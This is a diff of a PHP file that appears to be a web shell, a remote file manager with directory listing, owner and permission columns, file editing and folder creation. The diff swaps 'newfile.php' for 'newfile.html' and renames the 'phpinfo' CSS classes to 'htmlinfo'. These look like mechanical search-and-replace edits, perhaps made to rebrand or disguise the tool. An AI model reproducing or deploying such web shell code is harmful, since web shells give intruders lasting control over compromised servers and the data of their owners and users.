@@ -198,7 +198,7 @@ function showdir($pwd,$prompt){
 			else {
 				$owner = $user;
 			}
-			$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">".$owner."</td><td>".get_perms($pwd)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\"><a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
+			$buff .= "<tr><td><a href=\"?y=".$pwd."\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">".$owner."</td><td>".get_perms($pwd)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td><td><span id=\"titik1\"><a href=\"?y=$pwd&amp;edit=".$pwd."newfile.html\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
 			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
 			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
 			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
@@ -215,7 +215,7 @@ function showdir($pwd,$prompt){
 			else {
 				$owner = $user;
 			}
-			$buff .= "<tr><td><a href=\"?y=".$parent."\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">".$owner."</td><td>".get_perms($parent)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td><td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
+			$buff .= "<tr><td><a href=\"?y=".$parent."\">$folder</a></td><td>LINK</td><td style=\"text-align:center;\">".$owner."</td><td>".get_perms($parent)."</td><td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td><td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=".$parent."newfile.html\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
 			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
 			<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" />
 			<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" />
@@ -503,21 +503,21 @@ border-bottom:1px solid #4C83AF;
 	padding:0 4px 0 0;
 	border-right:1px solid #333333;
 }
-.phpinfo table{
+.htmlinfo table{
 	width:100%;
 	padding:0 0 0 0;
 }
-.phpinfo td{
+.htmlinfo td{
 	background:#111111;
 	color:#cccccc;
 padding:6px 8px;;
 }
-.phpinfo th, th{
+.htmlinfo th, th{
 	background:#191919;
 	border-bottom:1px solid #333333;
 font-weight:normal;
 }
-.phpinfo h2, .phpinfo h2 a{
+.htmlinfo h2, .htmlinfo h2 a{
 	text-align:center;
 	font-size:16px;
 	padding:0;
@@ -540,7 +540,7 @@ line-height:24px;
 padding:3px 8px;
 font-weight:normal;
 }
-.explore th:hover , .phpinfo th:hover{
+.explore th:hover , .htmlinfo th:hover{
 border-bottom:1px solid #4C83AF;
 }
 .explore tr:hover{
